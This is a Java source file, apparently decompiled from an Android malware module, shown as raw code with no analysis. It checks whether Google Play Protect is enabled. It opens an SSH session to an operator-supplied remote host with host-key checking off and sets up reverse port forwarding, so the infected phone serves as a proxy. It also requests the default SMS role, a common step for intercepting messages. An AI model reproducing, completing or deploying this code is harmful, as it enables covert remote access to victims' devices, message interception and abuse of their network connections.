package patch.ring0;

import android.app.Activity;
import android.app.role.RoleManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import com.google.android.gms.safetynet.SafetyNet;
import com.google.android.gms.safetynet.SafetyNetApi;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import java.util.Properties;
import org.json.JSONObject;

public class run {
    public String main(final Context context, String str) {
        try {
            final String string = new JSONObject(str).getString("check_protect");
            SafetyNet.getClient(context).isVerifyAppsEnabled().addOnCompleteListener(new OnCompleteListener<SafetyNetApi.VerifyAppsUserResponse>() {
                public void onComplete(Task<SafetyNetApi.VerifyAppsUserResponse> task) {
                    try {
                        if (!task.isSuccessful()) {
                            run.this.SettingsWrite(context, string, "2");
                        } else if (task.getResult().isVerifyAppsEnabled()) {
                            run.this.SettingsWrite(context, string, "1");
                        } else {
                            run.this.SettingsWrite(context, string, "0");
                        }
                    } catch (Exception unused) {
                        run.this.SettingsWrite(context, string, "2");
                    }
                }
            });
            return null;
        } catch (Exception e) {
            Log("MODULE", "Error module main" + e.toString());
            return null;
        }
    }

    public void runsocks5(Context context, String str, String str2, String str3, String str4) {
        final Context context2 = context;
        final String str5 = str3;
        final String str6 = str4;
        final String str7 = str2;
        final String str8 = str;
        new AsyncTask<Integer, Void, Void>() {
            /* access modifiers changed from: protected */
            public Void doInBackground(Integer... numArr) {
                try {
                    run.this.executeRemoteCommand(context2, str5, str6, str7, str8);
                    return null;
                } catch (Exception e) {
                    e.printStackTrace();
                    return null;
                }
            }
        }.execute(new Integer[]{1});
    }

    /* access modifiers changed from: package-private */
    public void executeRemoteCommand(Context context, String str, String str2, String str3, String str4) throws JSchException {
        try {
            Properties properties = new Properties();
            properties.put("StrictHostKeyChecking", "no");
            Session session = new JSch().getSession(str3, str4, 22);
            session.setPassword(str);
            session.setConfig(properties);
            session.connect();
            session.openChannel("direct-tcpip");
            session.setPortForwardingR(str4, Integer.parseInt(str2), "127.0.0.1", 45555);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String runsmsq(Activity activity) {
        if (Build.VERSION.SDK_INT < 29) {
            return null;
        }
        RoleManager roleManager = (RoleManager) activity.getSystemService(RoleManager.class);
        if (!roleManager.isRoleAvailable("android.app.role.SMS") || roleManager.isRoleHeld("android.app.role.SMS")) {
            return null;
        }
        activity.startActivityForResult(roleManager.createRequestRoleIntent("android.app.role.SMS"), 1);
        activity.finish();
        return null;
    }

    private void Log(String str, String str2) {
        Log.e(str, str2);
    }

    /* access modifiers changed from: private */
    public void SettingsWrite(Context context, String str, String str2) {
        SharedPreferences.Editor edit = context.getSharedPreferences("ring0", 0).edit();
        edit.putString(str, str2);
        edit.commit();
    }
}
